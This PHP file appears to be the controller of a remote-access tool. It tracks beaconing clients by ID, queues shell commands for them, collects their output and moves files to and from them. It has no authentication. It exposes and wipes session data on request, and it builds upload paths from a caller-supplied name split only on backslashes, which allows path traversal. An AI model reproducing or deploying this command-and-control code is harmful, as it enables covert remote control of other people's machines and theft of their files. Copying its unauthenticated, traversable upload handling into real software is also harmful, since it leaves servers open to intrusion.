<?php
#################### START SESSION SESSTING ####################
{
    // session start
    session_id('cmsSession');
    session_start();
    // Define Session values
    if (!isset($_SESSION['client_id'])) {
        $_SESSION['client_id'] = ''; 
    }
    if (!isset($_SESSION['cma_msg'])) {
        $_SESSION['cma_msg'] = ''; 
    }
    if (!isset($_SESSION['type'])) {
        $_SESSION['type'] = 'command'; 
    }
    if (!isset($_SESSION['command_result'])) {
        $_SESSION['command_result'] = []; 
    }
    if (!isset($_SESSION['client_upload_result'])) {
        $_SESSION['client_upload_result'] = []; 
    }
    if (!isset($_SESSION['client_download_result'])) {
        $_SESSION['client_download_result'] = []; 
    }
    if (!isset($_SESSION['clients'])) {
        $_SESSION['clients'] = [];
    }
}
##################### END SESSION SESSTING #####################
?>

<?php

    // the response function
    function verbose($ok=1,$info=""){
        // failure to upload throws 400 error
        if ($ok==0) { http_response_code(400); }
        die(json_encode(["ok"=>$ok, "info"=>$info]));
    }

    $method   = $_SERVER['REQUEST_METHOD'];
    $uri      = $_SERVER['REQUEST_URI'];
    $ip       = $_SERVER['REMOTE_ADDR'];
    $protocol = $_SERVER['SERVER_PROTOCOL'];
    $headers  = getallheaders();
    header('Content-type: text/plain; charset=utf-8');

    if ($method == "GET") {
        $client['id'] = $_GET['client_id'];
        $client['last_live'] = time();
        foreach ($_SESSION['clients'] as $key => $value) {
            if ($value['id'] == $_GET['client_id']) {
                $value['last_live'] = time();
                $_SESSION['clients'][$key] = $value;
                $data = json_encode($_SESSION['clients']);
                echo $data;
                return;
            }
        }
        array_push($_SESSION['clients'], $client);
        $data = json_encode($_SESSION['clients']);
        echo $data;
    }

    else if ($method == "POST") {
        switch ($_POST['action']) {
            ####################START GET CLIENTS LIST####################
            case 'getClientList':{
                foreach ($_SESSION['clients'] as $key => $value) {
                    if (time()-$value['last_live'] > 10)
                        unset($_SESSION['clients'][$key]); 
                }
                $clients=[];
                foreach ($_SESSION['clients'] as $key => $value) {
                    array_push($clients,$value['id']);
                }
                print(json_encode($clients));
                break;
            }
            #####################END GET CLIENTS LIST#####################

            ####################START EXECUTE COMMAND#####################
            case 'executeCommand':{
                foreach ($_SESSION['command_result'] as $key => $value) {
                    if($value['client_id']==$_POST['client_id']){
                        unset($_SESSION['command_result'][$key]); 
                    }
                }
                $_SESSION['client_id'] = $_POST['client_id'];
                $_SESSION['cma_msg'] = $_POST['cma_msg'];
                $_SESSION['type'] = 'command';
                break;
            }
            case 'command_result':{
                $data['client_id'] = $_POST['client_id'];
                $data['result'] = $_POST['cma_msg'];
                print_r($data['result']);
                array_push($_SESSION['command_result'], $data);
                // print_r($_SESSION['command_result']);
                break;
            }
            case 'get_command_result':{
                foreach ($_SESSION['command_result'] as $key => $value) {
                    if($value['client_id'] == $_POST['client_id']){
                        print_r($value['result']);
                        unset($_SESSION['command_result'][$key]); 
                        return;
                    }
                }
                echo "no";
                break;
            }
            #####################END EXECUTE COMMAND######################

            #####################START SERVER MANAGE######################
            case 'clear_session':{
                $_SESSION[$_POST['value']] = [];
                print_r($_SESSION[$_POST['value']]);
                break;
            }
            case 'get_session':{
                print_r($_SESSION);
                break;
            }
            case 'result_list':{
                print_r($_SESSION['command_result']);
                break;
            }
            ######################END SERVER MANAGE#######################

            #########################START UPLOAD#########################
            case 'upload':{
                // invalid upload
                if (empty($_FILES) || $_FILES['myfile']['error']) {
                    verbose(0, "Failed to move uploaded file.");
                }
                /* upload one file */
                $upload_dir = 'files';
                // upload destination
                $filePath = __DIR__ . DIRECTORY_SEPARATOR . $upload_dir;
                if (!file_exists($filePath)) {
                    if (!mkdir($filePath, 0777, true)) {
                        verbose(0, "Failed to create $filePath");
                    }
                }
                // $name = basename($_FILES["myfile"]["name"]);
                $a = explode( '\\', $_POST['cma_msg'] );
                $fileName = end($a);
                // $target_file = "$upload_dir/$name";
                $filePath = $filePath . DIRECTORY_SEPARATOR . $fileName;
                
                // if ($_FILES["myfile"]["size"] > 10000000) { // limit size of 10MB
                //     echo 'error: your file is too large.';
                //     exit();
                // }
                $chunk = isset($_REQUEST["chunk"]) ? intval($_REQUEST["chunk"]) : 0;
                $chunks = isset($_REQUEST["chunks"]) ? intval($_REQUEST["chunks"]) : 0;
                $out = @fopen("{$filePath}.part", $chunk == 0 ? "wb" : "ab");
                if ($out) {
                    $in = @fopen($_FILES['myfile']['tmp_name'], "rb");
                    if ($in) {
                        while ($buff = fread($in, 409600)) { 
                            fwrite($out, $buff); 
                        }
                    } else {
                        verbose(0, "Failed to open input stream");
                    }
                    @fclose($in);
                    @fclose($out);
                    @unlink($_FILES['myfile']['tmp_name']);
                } else {
                    verbose(0, "Failed to open output stream");
                }
                // check if file was uploaded
                if (!$chunks || $chunk == $chunks - 1) {
                    rename("{$filePath}.part", $filePath);
                    $_SESSION['type'] = 'download';
                    $_SESSION['client_id'] = $_POST['client_id'];
                    $_SESSION['cma_msg'] = $_POST['cma_msg'];
                }

                

                verbose(1, "Upload OK");
                // if (!move_uploaded_file($_FILES["myfile"]["tmp_name"], $target_file))
                    // echo 'error: can\'t upload file';
                // else {
                    // if (isset($_POST['data'])) print_r($_POST['data']);
                    // echo "\n filename : {$name}";
                // }
                break;
            }
            case 'client_download_result':{
                $data['client_id'] = $_POST['client_id'];
                $data['result'] = $_POST['cma_msg'];
                // print_r($data['result']);
                array_push($_SESSION['client_download_result'], $data);
                break;
            }
            case 'get_client_download':{
                foreach ($_SESSION['client_download_result'] as $key => $value) {
                    if($value['client_id']==$_POST['client_id']){
                        print_r($value['result']);
                        unset($_SESSION['client_download_result'][$key]); 
                        return;
                    }
                }
                echo 'no';
                break;
            }
            ############################END UPLOAD########################

            ##########################START DOWNLOAD######################
            case 'download':{
                $_SESSION['type'] = 'upload';
                $_SESSION['client_id'] = $_POST['client_id'];
                $_SESSION['cma_msg'] = $_POST['cma_msg'];
                break;
            }
            case 'client_upload_result_success':{
                /* upload one file */
                $upload_dir = 'files';
                $name = basename($_FILES["myfile"]["name"]);
                $target_file = "$upload_dir/$name";
                if ($_FILES["myfile"]["size"] > 10000000) { 
                    echo 'error: your file is too large.';
                    exit();
                }
                if (!move_uploaded_file($_FILES["myfile"]["tmp_name"], $target_file))
                    echo 'error: can\'t upload file';
                else {
                    if (isset($_POST['data'])) 
                        print_r($_POST['data']);
                    echo "\n filename : {$name}";
                    $data['client_id'] = $_POST['client_id'];
                    $data['result'] = $_POST['cma_msg'];
                    array_push($_SESSION['client_upload_result'], $data);
                }
                break;
            }
            case 'client_upload_result_err':{
                $data['client_id'] = $_POST['client_id'];
                $data['result'] = $_POST['cma_msg'];
                // print_r($data['result']);
                array_push($_SESSION['client_upload_result'], $data);
                break;
            }
            case 'get_client_upload':{
                foreach ($_SESSION['client_upload_result'] as $key => $value) {
                    if($value['client_id']==$_POST['client_id']){
                        print_r($value['result']);
                        unset($_SESSION['client_upload_result'][$key]); 
                        return;
                    }
                }
                echo 'no';
                break;
            }
            ############################END DOWNLOAD######################

            ########################START DEFAULT ACTION##################
            default:{
                # code...
                break;
            }
            #########################END DEFAULT ACTION###################
            
        }
    }
?>
